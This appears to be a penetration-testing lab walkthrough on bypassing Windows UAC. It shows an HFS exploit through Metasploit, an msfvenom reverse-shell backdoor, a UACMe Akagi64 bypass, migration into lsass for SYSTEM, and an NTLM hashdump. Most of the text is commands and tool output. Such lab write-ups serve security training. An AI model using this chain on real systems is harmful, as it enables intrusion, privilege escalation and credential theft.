UAC (User Account Control)
- User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system
- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrator groups
- A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt
- Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

Bypassing UAC
- In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.
- UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.
- UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with the elevated privileges without prompting the user for confirmation.
- There are multiple tools and techniques that can be used to bypass UAC, however the tool and technique used will depend on the version of Windows running on the target system.

Bypassing UAC with UACMe
- UACMe is an open source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques
	- Github: https://github.com/hfiref0x/UACME
- The UACME github repository contains a very well documented list of methods that can be used to bypass UAC on multiple version of Windows ranging from Windows 7 to Windows 10
- It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuit Windows AuteElevate tool.
- The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.
---

A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

Then, bypass [UAC](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)using the [UACME](https://github.com/hfiref0x/UACME) tool. 

**UACME:**

- Defeat Windows User Account Control (UAC) and get Administrator privileges.
- It abuses the built-in Windows AutoElevate executables.
- It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version.
- Developed by https://twitter.com/hFireF0X
- Written majorly in C, with some code in C++

**Objective:**Gain the highest privilege on the compromised machine and get admin user NTLM hash.

**Instructions:**

- Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
- The IP address of the target machine is mentioned in the file “/root/Desktop/target”
- Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

```
net users #to see the users in windows
net localgroup administrators #to see the users in the group administrators
```

[[ping]]

```
root@attackdefense:~# cat /root/Desktop/target 
Target IP Address : 10.5.18.130
root@attackdefense:~# ping -c 5 10.5.18.130
PING 10.5.18.130 (10.5.18.130) 56(84) bytes of data.
64 bytes from 10.5.18.130: icmp_seq=1 ttl=125 time=2.10 ms
64 bytes from 10.5.18.130: icmp_seq=2 ttl=125 time=1.58 ms
64 bytes from 10.5.18.130: icmp_seq=3 ttl=125 time=1.49 ms
64 bytes from 10.5.18.130: icmp_seq=4 ttl=125 time=1.68 ms
64 bytes from 10.5.18.130: icmp_seq=5 ttl=125 time=1.57 ms

--- 10.5.18.130 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 1.491/1.684/2.098/0.215 ms
```

[[Hack2.0/NMAP#General Scan|NMAP basic scan]]

```
root@attackdefense:~# nmap 10.5.18.130
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-18 12:39 IST
Nmap scan report for 10.5.18.130
Host is up (0.0017s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49165/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.65 seconds
```

Once we open the portal using the http://10.5.18.130 we can see that the service running is Simple HTTPFileserver 2.3

```
root@attackdefense:~# nmap -sC 10.5.18.130
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-18 12:39 IST
Nmap scan report for 10.5.18.130
Host is up (0.0017s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE
80/tcp    open  http
|_http-title: HFS /
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: VICTIM
|   NetBIOS_Domain_Name: VICTIM
|   NetBIOS_Computer_Name: VICTIM
|   DNS_Domain_Name: victim
|   DNS_Computer_Name: victim
|   Product_Version: 6.3.9600
|_  System_Time: 2023-07-18T07:09:56+00:00
| ssl-cert: Subject: commonName=victim
| Not valid before: 2023-07-17T06:56:26
|_Not valid after:  2024-01-16T06:56:26
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49165/tcp open  unknown

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-18T07:09:58
|_  start_date: 2023-07-18T06:56:22

Nmap done: 1 IP address (1 host up) scanned in 86.10 seconds
```

[[metasploit]]

```
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 13 database server: main.
       =[ metasploit v6.0.21-dev                          ]
+ -- --=[ 2087 exploits - 1126 auxiliary - 354 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the 
last opened session

msf6 > setg rhosts 10.5.18.130
rhosts => 10.5.18.130
msf6 > search type:exploit name:rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.5.18.130      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.19.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.19.3:4444 
[*] Using URL: http://0.0.0.0:8080/izL4b5x
[*] Local IP: http://10.10.19.3:8080/izL4b5x
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /izL4b5x
[*] Sending stage (175174 bytes) to 10.5.18.130
[*] Meterpreter session 1 opened (10.10.19.3:4444 -> 10.5.18.130:49268) at 2023-07-18 12:44:18 +0530
[!] Tried to delete %TEMP%\aLCeKBEgLEo.vbs, unknown result
[*] Server stopped.

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > net user
[-] Unknown command: net.
meterpreter > pgrep explorer
2760
meterpreter > migrate 2760
[*] Migrating from 2060 to 2760...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > shell
Process 2132 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net user
net user

User accounts for \\VICTIM

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
The command completed successfully.


C:\Windows\system32>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.

C:\Windows\system32>net user admin password123
net user admin password123
System error 5 has occurred.

Access is denied.

C:\Windows\system32>^C
Terminate channel 1? [y/N]  y
```

[[msfvenom]]

```
root@attackdefense:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.3 LPORT=1234 -f exe -o backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: backdoor.exe
root@attackdefense:~# ls
Desktop  backdoor.exe  thinclient_drives
```

[[metasploit]] # to start the multi/handler to listen for the backdoor connection

```
root@attackdefense:~# msfconsole
       =[ metasploit v6.0.21-dev                          ]
+ -- --=[ 2087 exploits - 1126 auxiliary - 354 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Tired of setting RHOSTS for modules? Try 
globally setting it with setg RHOSTS x.x.x.x

msf6 > search type:exploit name:handler

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/freebsd/misc/citrix_netscaler_soap_bof              2014-09-22       normal     Yes    Citrix NetScaler SOAP Handler Remote Code Execution
   1  exploit/linux/local/blueman_set_dhcp_handler_dbus_priv_esc  2015-12-18       excellent  Yes    blueman set_dhcp_handler D-Bus Privilege Escalation
   2  exploit/multi/handler                                                        manual     No     Generic Payload Handler
   3  exploit/windows/browser/ms05_054_onload                     2005-11-21       normal     No     MS05-054 Microsoft Internet Explorer JavaScript OnLoad Handler Remote Code Execution
   4  exploit/windows/browser/notes_handler_cmdinject             2012-06-18       excellent  No     IBM Lotus Notes Client URL Handler Command Injection
   5  exploit/windows/local/bypassuac_comhijack                   1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   6  exploit/windows/local/bypassuac_sluihijack                  2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)


Interact with a module by name or index. For example info 6, use 6 or use exploit/windows/local/bypassuac_sluihijack

msf6 > use 3
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/browser/ms05_054_onload) > back
msf6 > use 2
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.19.3
lhost => 10.10.19.3
msf6 exploit(multi/handler) > set lport 1234
lport => 1234
msf6 exploit(multi/handler) > run
```

[[metasploit]] # to upload the backdoor and the UACMe akagi.exe we use the first metasploit connection by creating a temp folder and executing the UACMe.exe

```
meterpreter > pwd
C:\Windows\system32
meterpreter > get uid
[-] Unknown command: get.
meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > cd C:\\
meterpreter > mkdir Temp
Creating directory: Temp
meterpreter > cd Temp 
meterpreter > upload backdoor.exe
[*] uploading  : /root/backdoor.exe -> backdoor.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/backdoor.exe -> backdoor.exe
[*] uploaded   : /root/backdoor.exe -> backdoor.exe
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
[*] uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] uploaded   : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
meterpreter > shell
Process 2036 created.
Channel 4 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Temp>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\Temp

07/18/2023  07:33 AM    <DIR>          .
07/18/2023  07:33 AM    <DIR>          ..
07/18/2023  07:33 AM           199,168 Akagi64.exe
07/18/2023  07:33 AM            73,802 backdoor.exe
               2 File(s)        272,970 bytes
               2 Dir(s)   8,270,569,472 bytes free

C:\Temp>.\Akagi64.exe 23 C:\Temp\backdoor.exe
.\Akagi64.exe 23 C:\Temp\backdoor.exe

C:\Temp>
```

[[metasploit]] # this is from the multi handler

```
[*] Started reverse TCP handler on 10.10.19.3:1234 
[*] Sending stage (175174 bytes) to 10.5.18.130
[*] Meterpreter session 1 opened (10.10.19.3:1234 -> 10.5.18.130:49337) at 2023-07-18 13:05:06 +0530

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 88    676   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 348   676   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 368   4     smss.exe              x64   0                                      
 468   676   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 516   508   csrss.exe             x64   0                                      
 572   2580  conhost.exe           x64   1        VICTIM\admin                  C:\Windows\System32\conhost.exe
 584   576   csrss.exe             x64   1                                      
 592   508   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 636   576   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 676   592   services.exe          x64   0                                      
 684   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 748   676   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 780   676   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 868   636   dwm.exe               x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 876   676   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 908   676   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 956   676   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1120  676   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1148  676   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1176  676   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1228  676   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1248  676   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1304  676   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1368  676   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1624  748   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1676  2036  Akagi64.exe           x64   1        VICTIM\admin                  C:\Temp\Akagi64.exe
 1832  1676  PkgMgr.exe            x64   1        VICTIM\admin                  C:\Windows\System32\PkgMgr.exe
 1964  2760  hfs.exe               x86   1        VICTIM\admin                  C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe
 2036  2760  cmd.exe               x64   1        VICTIM\admin                  C:\Windows\System32\cmd.exe
 2324  2008  backdoor.exe          x86   1        VICTIM\admin                  C:\Temp\backdoor.exe
 2360  676   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 2488  2036  conhost.exe           x64   1        VICTIM\admin                  C:\Windows\System32\conhost.exe
 2580  2060  cmd.exe               x86   1        VICTIM\admin                  C:\Windows\SysWOW64\cmd.exe
 2712  908   taskhostex.exe        x64   1        VICTIM\admin                  C:\Windows\System32\taskhostex.exe
 2760  2752  explorer.exe          x64   1        VICTIM\admin                  C:\Windows\explorer.exe

meterpreter > migrate 684
[*] Migrating from 2324 to 684...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > get uid
[-] Unknown command: get.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
```

